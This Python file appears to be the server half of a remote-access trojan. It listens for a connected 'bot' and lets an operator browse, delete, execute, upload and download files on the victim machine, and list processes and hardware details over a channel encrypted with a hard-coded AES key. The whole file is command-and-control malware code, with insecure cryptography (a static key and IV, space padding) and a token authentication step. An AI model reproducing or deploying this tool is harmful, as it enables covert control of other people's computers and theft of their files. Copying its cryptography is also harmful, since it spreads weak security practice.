import socket
from Crypto.Cipher import AES
import os

#secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
secret_key=b'b\x90\xf7\x1d\\KY\xc3\xd7\x13\xf1\x90\xba\xe4HS\xe3\xce\x1cd\x8f\xdf\xda\xc8u\xa9B\x85-&<\xb7'
Initialization_vector = b'This is a testIV'#IV must be 16 bytes long


def help_function():
    print("\n\n")
    print("This is the Help manual")
    print("1. pwd (Prints the directory you are currently in)")
    print("2. dir (List all files and folders in the current working directory)")
    print("3. cd '/path/' (Change the working directory)")
    print("4. remove 'filename' (Removes a file with name 'filename')")
    print("5. removedir 'foldername' (Removes the specified folder)")
    print("6. createdir 'foldername' (creates a folder)")
    print("7. read 'filename' (reads from a file)")
    print("8. write 'filename' (writes to file)")
    print("9. download 'filename' (downloads a file from the client to the server)")
    print("10. upload 'filename' (uploads a file from server to client)")
    print("11 execute 'filename' (executes a file)")
    print("12 ip (prints the clients ip)")
    print("13 info (prints hardware information cpu, disk space etc.)")
    print("14 processes (prints the running processes.)")
    print("\n\n")



def padding(message):
        while(len(message)%16!=0):
            message = message +" "
        return  message.encode()

def unpadding(message):
    while message.endswith(" "):
        message = message[:-1]
    return message
    

def encryption(messageToEncrypt):
    obj = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
    return obj.encrypt(messageToEncrypt)

def decryption(ciphertext):
    obj2 = AES.new(secret_key, AES.MODE_CBC,Initialization_vector)
    return obj2.decrypt(ciphertext).decode()

def data_receiver(con, sending_message):
    print("Sending message: ", sending_message)
    con.send(encryption(padding(str(len(sending_message)))))
    con.sendall(encryption(padding(sending_message)))
    i = 0
    if i<100:
        print("Waiting for response....")
        #Server is getting back data
        data_len = int(decryption(con.recv(1024)))
        print(data_len)    
        received_message = con.recv(1024)
        while len(received_message) < data_len:
            if data_len - len(received_message)>1024:
                received_message += con.recv(1024)
                print(len(received_message))
            else:
                i+=1
                print(len(received_message), "else")
                received_message += con.recv(data_len - len(received_message))
                if i>100:
                    break
        received_message = decryption(received_message)    
        unpadding(received_message)
        return received_message
    
def getFileFromBot(filename,con,sending_message):
    con.send(encryption(padding(str(len(sending_message)))))
    con.sendall(encryption(padding(sending_message)))
    
    print(" This is the sending message" + sending_message)
    filesize = int(unpadding(decryption(con.recv(1024))))
    print(filesize)
    with open(filename, 'wb') as f:
        print('file opened')
        total=0
        while total<filesize:
            print('receiving data...')
            if total-filesize>1024:
                data = con.recv(1024)
            else:
                data = con.recv(filesize-total)
            print('data=%s', (data))
            total+=len(data)
            f.write(data)

    f.close()
    print('Successfully got the file')

#  we need a way to encrypt files
def sendFileToBot(con,sending_message):
    filename = sending_message[7:]
    if(os.path.exists(filename)):
        print("Sending message: ", sending_message)
        #sends upload filename
        con.send(encryption(padding(str(len(sending_message)))))
        con.sendall(encryption(padding(sending_message)))
        #filename sended
    
        print("Waiting for response....")
        #Server is getting back data
        data_len = int(decryption(con.recv(1024)))
        
        received_message = con.recv(1024)
        while len(received_message) < data_len:
            received_message += con.recv(1024)
        received_message = decryption(received_message)    
        received_message = unpadding(received_message)
        #get message back
        if received_message == "Start uploading":
            total = os.path.getsize(filename)
            padded_message =  padding(str(total))
            con.sendall(encryption(padded_message))
        # start sending
            try:    
                f = open(filename,'rb')
                l = f.read(4096)
                while (l):
                    con.send(l)
                    print('Sent ',repr(l))
                    l = f.read(4096)
                sending_message = "Done"
            except Exception as e:
                sending_message="Exception: " + str(e) 
            finally:
                try:
                    f.close()
                    return sending_message
                except Exception as e:
                    return str(e)  
        else:
            return received_message
    else:
        return "File does not exist "
    
        



    

def serverA():
    host = "0.0.0.0" #listen at all interfaces
    port = 5000
    
    mySocket = socket.socket()
    mySocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    mySocket.bind((host,port))

    mySocket.listen(1)#only 1 client can connect
    print("Listening for incoming connections")
    con,addr = mySocket.accept()

    
    #auth
   
        
    received_message = con.recv(1024)
    received_message = decryption(received_message)    
    received_message = unpadding(received_message)
    print("Key received: %s" %received_message)
    received_message = float(received_message)*2
    print("Sending Key: %s" %received_message)
    con.sendall(encryption(padding(str(received_message))))


    
    #Getting the first message with the ip of the connected client
    received_message= decryption(con.recv(4096))
    unpadding(received_message)
    print("Auth completed")
    print(received_message)
    
    while(True):
        received_message=""
        sending_message = input("Enter you message: ")

        while not sending_message:
            sending_message = input("Enter you message: ")
            
######### implement the write         
        if sending_message[0:5] == "write":
            con.send(encryption(padding(str(len(sending_message)))))
            con.sendall(encryption(padding(sending_message)))
      
            sending_message = input("Write to the file: ")
            received_message = data_receiver(con, sending_message)
        
        
        
        if sending_message.lower() == "help":
            help_function()
        elif(sending_message[0:8]=="download"):
            sending_message=getFileFromBot(sending_message[9:],con,sending_message)
        elif(sending_message[0:6]=="upload"):
            sending_message=sendFileToBot(con,sending_message)
            print(sending_message)
        else:
            print("went to the data receiver")
            received_message = data_receiver(con, sending_message)
            print("Client respond with: " + received_message)      


if __name__ == '__main__':
    serverA()
